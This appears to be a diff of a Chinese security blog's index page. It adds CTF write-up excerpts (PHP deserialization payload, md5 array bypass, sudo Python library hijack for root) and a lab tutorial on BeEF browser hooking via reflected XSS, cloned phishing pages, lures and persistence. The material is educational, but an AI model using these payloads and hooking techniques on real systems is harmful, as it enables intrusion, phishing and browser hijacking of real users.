@@ -205,6 +205,701 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2023/11/29/tmp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/29/tmp/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-29 09:05:11 / 修改时间：09:16:42" itemprop="dateCreated datePublished" datetime="2023-11-29T09:05:11+08:00">2023-11-29</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><p>圣杯</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$excalibuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arrow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$release</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weapon</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Saber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Rider</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> summon();</span><br><span class="line"><span class="variable">$a</span>-&gt;Saber = <span class="keyword">new</span> artifact();</span><br><span class="line"><span class="variable">$a</span>-&gt;Saber-&gt;excalibuer = <span class="keyword">new</span> prepare();</span><br><span class="line"><span class="variable">$a</span>-&gt;Saber-&gt;arrow = <span class="variable">$sb</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;Saber-&gt;excalibuer-&gt;release = <span class="keyword">new</span> saber();</span><br><span class="line"><span class="variable">$a</span>-&gt;Saber-&gt;excalibuer-&gt;release-&gt;weapon = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>绕过</p>
+<p>  数组绕过md5<br>  hongmeng[]=1&amp;shennong[]=2</p>
+<p>  数组绕过<br>  zhurong[]=1</p>
+<p>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120667769">偷脚本</a></p>
+  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://43.249.195.138:20583/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=1&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;pan_gu&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;2023ISCTF&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>wafr</p>
+<p>  逆天绕过，<code>payload: code=[l]s /*</code></p>
+<p>  直接暴力输出所有</p>
+</li>
+<li><p>sudopy</p>
+<p>  <code>sudo -l</code> 看一下能运行的，打开脚本看一下发现导入了 <code>webbrowser</code> 库</p>
+<p>  看<code>passwd</code> 不能横向移动，应该是降低难度了</p>
+<p>  直接库劫持</p>
+<p>  <code>find / -name webbrowser.py 2&gt;/dev/null</code></p>
+<p>  找源文件，<code>chmod</code> 可以加权限</p>
+<p>  加入 <code>os.system(“/bin/bash”)</code></p>
+<p>  然后运行 <code>py</code> 即可提权</p>
+</li>
+</ul>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/29/tmp/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2023/11/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">PHP反序列化基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-20 17:15:00 / 修改时间：22:31:29" itemprop="dateCreated datePublished" datetime="2023-11-20T17:15:00+08:00">2023-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>看历年比赛题看到了一个很重要的东西，正好快考试了直接现学</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2023/11/11/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6beef/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/11/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6beef/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-11-11 20:16:07" itemprop="dateCreated datePublished" datetime="2023-11-11T20:16:07+08:00">2023-11-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-16 10:39:22" itemprop="dateModified" datetime="2023-11-16T10:39:22+08:00">2023-11-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li><p><code>BeEF</code> 框架</p>
+<ul>
+<li><p>介绍</p>
+<p>  <code>Ruby</code> 中内置的框架，用于评估浏览器的安全性</p>
+<p>  创造一个链接来连接浏览器，链接通常是 <code>JS</code> 编写的 <code>hook</code> ，在浏览器与服务器之间建立一个检测信号，可以允许攻击者向目标浏览器发送 <code>JS</code> 命令，浏览器再将回应返给攻击者</p>
+<p>  其发送的是 <code>web</code> 请求，发生在浏览器所配置的代理之上，能穿过防火墙。所以目标浏览器一旦运行了 <code>JS</code> 挂钩，那么攻击者对浏览器活动就有很高的权限</p>
+<p>  这个 <code>kali</code> 里面也是有内置的，但笔者建议把内置的删掉再安装最新的</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get purge --auto-remove beef</span><br><span class="line">apt-get purge --auto-remove beef-xss</span><br><span class="line">git clone https://github.com/beefproject/beef</span><br><span class="line">./install</span><br></pre></td></tr></table></figure>
+<p>  然后去 <code>config.yaml</code> 中更改默认密码</p>
+</li>
+<li><p>使用</p>
+<p>  <code>./beef</code> 启动</p>
+<p>  <code>./beef -x</code> 清理数据库</p>
+<ul>
+<li><p><code>beef</code> 控制台使用</p>
+<p>  <code>http://127.0.0.1:3000/ui/panel</code> 中访问图形化界面</p>
+<p>  <img src="https://pic.imgdb.cn/item/654ae5fcc458853aef450d20.jpg" alt></p>
+<p>  点击箭头处链接浏览器就会上线，可以在左边栏看到</p>
+<p>  <img src="https://pic.imgdb.cn/item/654ae6cec458853aef469ef0.png" alt></p>
+<p>  对于 <code>Command</code> 模块，绿色代表可以在当前浏览器上执行，且当前使用用户不会察觉；下方的橙色代表可执行，但用户可能发觉；灰色代表无法确定该命令能否执行；红色可以执行，但结果未知，即无法生效</p>
+</li>
+<li><p>挂钩浏览器</p>
+<p>  无论是反射型 <code>xss</code> 或者 <code>arp</code> 欺骗，最终目的都是让目标浏览器访问/加载 <code>beef</code> 的 <code>hook</code> 页面 <code>http://127.0.0.1:3000/demos/basic.html</code></p>
+<ul>
+<li><p>以基本的反射型 <code>xss</code> 为例</p>
+<p>  首先需要一个易受 <code>xss</code> 攻击的网站，新建一个 <code>php</code> 页面，代码如下</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; &lt;BODY&gt; &lt;FORM&gt;</span><br><span class="line">&lt;INPUT TYPE=TEXT NAME=<span class="keyword">echo</span> VALUE=<span class="string">&quot;&lt;?php print <span class="subst">$_REQUEST</span>[&#x27;echo&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=SUBMIT&gt; &lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+<p>  那么靶机访问 <code>http://192.168.19.128/echo.php?echo=%22%3E%3Cscript%20src=%22http://192.168.19.128:3000/hook.js%22%3E%3C%2Fscript%3E%22</code> 则会成功链接</p>
+</li>
+<li><p><code>ettercap DNS</code> 欺骗</p>
+<p>  欺骗到 <code>beef</code> 生成的钩子地址上即可</p>
+</li>
+<li><p>自动注入挂钩</p>
+<p>  借助 <code>beef injection framework</code> 自动重写 <code>web</code> 流量使其包含挂钩</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SpiderLabs/beef_injection_framework</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>获取指纹实践</p>
+<ul>
+<li><p>浏览器指纹</p>
+<p>  <code>command-browser-fingerprint</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/654ca72dc458853aef2f55b8.jpg" alt></p>
+</li>
+<li><p>用户指纹</p>
+<p>  包括浏览器存储的 <code>cookie</code> ，用户会话历史，综合以上信息可知到用户常访问的网站类型</p>
+<p>  用 <code>beef</code> 高级演示页面来演示</p>
+<p>  即靶机访问 <code>[IP]:3000/demos/butcher/index.html</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/654cab5dc458853aef39929a.jpg" alt></p>
+<p>  在下方填入的信息即便不提交，也可以在 <code>beef</code> 中使用 <code>command-browser-get form value</code> 查看到</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>接下来跟着<a target="_blank" rel="noopener" href="https://www.freebuf.com/author/NT00">这位</a>来复现一遍操作</p>
+<ul>
+<li><p>初始化控制</p>
+<ul>
+<li><p><code>XSS</code></p>
+<p>  在真实环境中，对于 <code>beef</code> 这种需要加载远程 <code>js</code> 的 <code>XSS</code> 攻击，存在一种更优的防御方法，即 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP"><code>CSP</code></a> ，内容安全策略。其同于检测并削弱某些特定类型攻击。</p>
+<p>  <code>CSP</code> 规定页面从哪里加载脚本，以及对脚本做出限制，如限制执行 <code>js</code> 的 <code>eval()</code> 函数，如</p>
+  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27; &quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>  该段指令让浏览器仅加载同源资源，以防止异源的 <code>beef</code> 攻击</p>
+</li>
+<li><p>有安全漏洞的 <code>Web</code> 应用</p>
+</li>
+<li>广告网路</li>
+<li><p>社工</p>
+<ul>
+<li><p>网站搭建</p>
+<p>  使用 <code>beef</code> 自带的 <code>Web</code> 克隆功能，其默认在被克隆的网站内容中注入钩子，注意此克隆在 <code>beef</code> 被关闭后被销毁</p>
+<p>  <img src="https://pic.imgdb.cn/item/654f73e9c458853aef28688d.jpg" alt></p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span> <span class="literal">-d</span> <span class="string">&#x27;&#123;&quot;url&quot;:&quot;[目标网站网址]&quot;,&quot;mount&quot;:&quot;[放在本地的位置]&quot;&#125;&#x27;</span> <span class="literal">-X</span> POST http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3000</span>/api/seng/clone_page?token=[上面的<span class="type">token</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span> <span class="literal">-d</span> <span class="string">&#x27;&#123;&quot;url&quot;:&quot;https://www.baidu.com&quot;,&quot;mount&quot;:&quot;/testclone&quot;&#125;&#x27;</span> <span class="literal">-X</span> POST http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3000</span>/api/seng/clone_page?token=b75029028687f8dbdebdfb842d868ca516914e86</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/654f751dc458853aef2d937c.jpg" alt></p>
+<p>  搭建成功后发现僵尸不上线，查看网站源码，发现是 <code>js</code> 地址错误</p>
+<p>  <img src="https://pic.imgdb.cn/item/65518ef8c458853aef5b3f84.jpg" alt></p>
+<p>  到配置文件 <code>config.yaml</code> 里</p>
+<p>  <img src="https://pic.imgdb.cn/item/65518fa6c458853aef5d48aa.jpg" alt></p>
+<p>  改成本机的 <code>IP</code> 即可，随后重启服务</p>
+</li>
+<li><p>诱饵</p>
+<ul>
+<li><p>钓鱼邮件</p>
+<p>  需要模糊，缩短 <code>url</code>，并设计自己的邮件系统</p>
+</li>
+<li><p>物理诱惑</p>
+<p>  有 <code>html</code> 文件的u盘</p>
+</li>
+<li><p><code>QR code</code></p>
+<p>  感觉是最为保险的手段</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>中间人攻击</p>
+<p>  此类攻击仅当和受害者在同一网络下才可进行，考虑用 <code>aircrack-ng</code> 破解 <code>wifi</code> 密码</p>
+<p>  这里使用 <code>mitmproxy</code> ，顺便记录一下使用时的问题</p>
+<ul>
+<li><p>安装</p>
+<ul>
+<li><p>报错 <code>1</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">raise ValueError(f&#x27;mutable default &#123;type(f.default)&#125; for field &#x27;</span><br><span class="line">ValueError: mutable default &lt;class &#x27;mitmproxy.contentviews.grpc.ProtoParser.ParserOptions&#x27;&gt; for field parser_options is not allowed: use default_factory</span><br></pre></td></tr></table></figure>
+<p>  解决方案是更新 <code>apt</code> 源并更新 <code>mitmproxy</code> ，大概原因是 <code>kali</code> 内置的版本过老，不支持本机的 <code>python3.11</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt-get install mitmproxy</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>报错 <code>2</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: module &#x27;OpenSSL.SSL&#x27; has no attribute &#x27;DTLS_SERVER_METHOD&#x27;. Did you mean: &#x27;TLS_SERVER_METHOD&#x27;?</span><br></pre></td></tr></table></figure>
+<p>  应该是 <code>pyOpenSSL</code> 的问题，更新一下</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install mitmproxy</span><br></pre></td></tr></table></figure>
+<p>  但又遇到了 <code>pip3</code> 报错</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: externally-managed-environment</span><br></pre></td></tr></table></figure>
+<p>  我搜到的解决方案是使用</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install mitmproxy --break-system-packages</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>使用</p>
+<p>  在新版的 <code>mitmproxy</code> 中 <code>-R</code> 参数已经失效，笔者目前并没有找到正确的脚本来进行钩子的插入</p>
+<p>  （哭哭</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>持续控制</p>
+<p>  初始的控制仅发生在用户点击的页面内，一旦用户关闭该页面或浏览器就会失去控制，所以要尽可能维持控制以给后续的攻击争取时间</p>
+<p>  持续控制分为两种：持久通信，<code>beef</code> 服务器与僵尸之间通信技术的选择；持久存续，让用户尽可能停留在钩子页面</p>
+<ul>
+<li><p>持久通信</p>
+<ul>
+<li><p><code>CORS</code> 跨域资源共享</p>
+<p>  其扩展了同源策略的限制，允许页面读取来自其他来源的 <code>http</code> 响应，即 <code>beef</code> 发送的命令对于浏览器一定是异源的，故其发送的每个 <code>http</code> 头部都包含：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Methods: POST, GET</span><br></pre></td></tr></table></figure>
+<p>  以允许来自任意地方的 <code>post/get</code> 请求</p>
+</li>
+<li><p>开启 <code>Websocket</code> 通信</p>
+<p>  其速度快于 <code>beef</code> 默认使用的 <code>XMLHTTPRequest</code> ，但其不适用于低版本的浏览器： <code>IE&gt;=10</code> , <code>Firefox&gt;=16.0</code> , <code>chrome&gt;=23.0</code></p>
+<p>  在默认下，<code>kali</code> 中其配置文件位于 <code>/usr/share/beef-xss/config.yaml</code></p>
+<p>  做出如下修改</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Prefer WebSockets over XHR-polling when possible.</span><br><span class="line">    websocket:</span><br><span class="line">        enable: true</span><br></pre></td></tr></table></figure>
+<p>  <code>beef</code> 会根据浏览器版本自动选择是否使用 <code>websocket</code></p>
+</li>
+</ul>
+</li>
+<li><p>持久存续</p>
+<ul>
+<li><p>内嵌 <code>iframe</code> 框架</p>
+<p>  <code>persistence-Create foreground iFrame</code> 模块，不需任何参数即可执行，在僵尸浏览器上创造一个 <code>100%</code> 的 <code>iframe</code></p>
+<p>  在用户点击一个新界面时代码生效</p>
+<p>  其弊端是顶部的 <code>url</code> 栏不会改变，如图</p>
+<p>  <img src="https://pic.imgdb.cn/item/655190dcc458853aef602069.jpg" alt></p>
+<p>  而对于使用 <code>js</code> 渲染的页面则会出现页面混乱，点击无效等情况</p>
+</li>
+<li><p><code>MitB</code> 浏览器中间人</p>
+<p>  与中间人攻击不同，不需要处在同一网络下。<code>Persistence-Man In The Browser</code> 模块在僵尸浏览器中用 <code>js</code> 自动截获/发送 <code>http</code> 的内容，并异步展现给用户</p>
+<p>  在用户正常访问的同时能保持钩子</p>
+<p>  其弊端也很明显，即不能打开图片</p>
+<p>  以及对于 <code>js</code> 制作的跨域链接，由于 <code>MitB</code> 实现原理缺陷导致其无法控制新页面</p>
+<p>  注意 <code>MitB</code> 与 <code>iframe</code> 只能使用一种</p>
+</li>
+<li><p>窗口事件处理</p>
+<p>  <code>Persistence-Confirm Close Window</code> 不断弹出如下窗口</p>
+<p>  <img src="https://pic.imgdb.cn/item/655194e2c458853aef6b3080.jpg" alt></p>
+<p>  但如今的浏览器早已不再允许反复弹出，对于不同浏览器该模块有着不同表现</p>
+<p>  <code>firefox</code> 和 <code>chrome</code> 只有在关闭浏览器时才会有弹窗; <code>360</code> 在关闭当前页面或关闭浏览器时都会有弹窗; <code>QQ</code> 点击关闭当前页面之后，它会打开一个新标签页去加载<code>BeEF</code> 服务器的 <code>demo</code> 页面;搜狗全部都没有弹窗。</p>
+<p>  如此仅能使用户多停留几秒，但这几秒也是值得争取的，所以可以与上两种的一种结合使用</p>
+</li>
+<li><p><code>动态底层弹出窗口</code></p>
+<p>  <code>Persistence-Create Pop Under</code> 可以在用户点击链接时弹出一个指向 <code>beef</code> 初始化页面的窗口。浏览器常常会阻止网站弹出，而由用户点击的操作则不影响</p>
+<p>  弊端是如此只能弹出 <code>beef</code> 窗口，会导致用户察觉，而且笔者这里用 <code>chrome</code> 复现失败</p>
+<p>  <img src="https://pic.imgdb.cn/item/655197b9c458853aef71f1e1.jpg" alt></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>绕过同源策略与浏览器代理</p>
+<ul>
+<li><p><code>SOP</code> 与 <code>DOM</code> 文档对象模型</p>
+<p>  浏览器同源策略，限制不同源的交互，致使 <code>beef</code> 仅能对被钩子钩住的页面所在域进行操作，绕过同源策略可以考虑旧版浏览器及其插件漏洞，或者利用 <code>Web</code> 的特性，这里介绍后者</p>
+<p>  当子域之间需要相互访问时，如 <code>login.site.com</code> 需要访问 <code>admin.site.com</code> 的表单，开发者会在 <code>admin.site.com</code> 所在页面加入如下 <code>js</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain=&quot;site.com&quot;</span><br></pre></td></tr></table></figure>
+<p>  那么 <code>site.com</code> 下所有子域都可以访问 <code>admin.site.com</code> 的 <code>DOM</code></p>
+<p>  那么当 <code>beef</code> 钩住 <code>test.site.com</code> ，可以查找具有此类的页面，从而小范围绕过 <code>SOP</code> 的限制</p>
+</li>
+<li><p><code>SOP</code> 与 <code>CORS</code></p>
+<p>  与上文类似的，由于 <code>Web</code> 开发者错误的设置导致可以进行跨域资源共享，在子站 <code>test.site.com</code> 加入以下代码</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *.site.com</span><br><span class="line">Access-Control-Allow-Methods: OPTIONS, GET, POST</span><br></pre></td></tr></table></figure>
+<p>  会导致 <code>site.com</code> 的所有子站都可以访问 <code>test.site.com</code> 的资源</p>
+</li>
+<li><p><code>Tunneling Proxy</code> 浏览器代理</p>
+<p>  <code>beef</code> 中极为强大的一个功能</p>
+<p>  对于被钩住的僵尸浏览器 <code>A</code> 以及被钩住的域 <code>hook-domain.com</code> ，攻击浏览器 <code>B</code> :</p>
+<p>  <code>B</code> 通过 <code>beef</code> 发送 <code>http</code> 请求，转为 <code>AJAX</code> 请求插入僵尸浏览器 <code>B</code> 随后要执行的 <code>js</code> 脚本中，浏览器 <code>B</code> 向域 <code>hook-domain.com</code> 发送一个 <code>AJAX</code> 请求，且请求带上了该网站的 <code>cookie</code> ，域返回的请求则会被钩子截取并返回给攻击浏览器 <code>A</code> ，而不会显示在浏览器 <code>B</code> 上</p>
+<p>  完成这个实验需要三个不同的浏览器，僵尸浏览器 <code>A</code> ，攻击者浏览器 <code>B</code> 用于登录 <code>beef</code> 服务器，攻击者浏览器 <code>C</code> 用于使用代理，三者不共享数据</p>
+<p>  先去 <code>extensions/proxy/config.yaml</code> 确保 <code>enable</code> 为 <code>true</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/655350bec458853aef0df4f2.jpg" alt></p>
+<p>  对于被钩住的浏览器 <code>B</code> 选择 <code>Use as proxy</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/65535049c458853aef0ce5b3.jpg" alt></p>
+<p>  如此， <code>beef</code> 所在主机的 <code>6789</code> 端口就是一个代理</p>
+<p>  使用 <code>firefox -P</code> 打开另一个不共享数据的浏览器</p>
+<p>  <img src="https://pic.imgdb.cn/item/65535248c458853aef11a2a8.jpg" alt></p>
+<p>  将其代理设为 <code>127.0.0.1 port:6789</code> 与配置文件保持统一</p>
+</li>
+</ul>
+</li>
+</ul>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/11/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6beef/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2023/11/10/%E5%AE%89%E5%85%A8%E7%89%9B%E8%AF%BE%E5%A0%82%E7%AC%AC%E4%B8%89%E7%AB%A0-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5%E5%92%8C%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/10/%E5%AE%89%E5%85%A8%E7%89%9B%E8%AF%BE%E5%A0%82%E7%AC%AC%E4%B8%89%E7%AB%A0-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5%E5%92%8C%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">安全牛第三章-安全测试实践</a>
+        </h2>
+
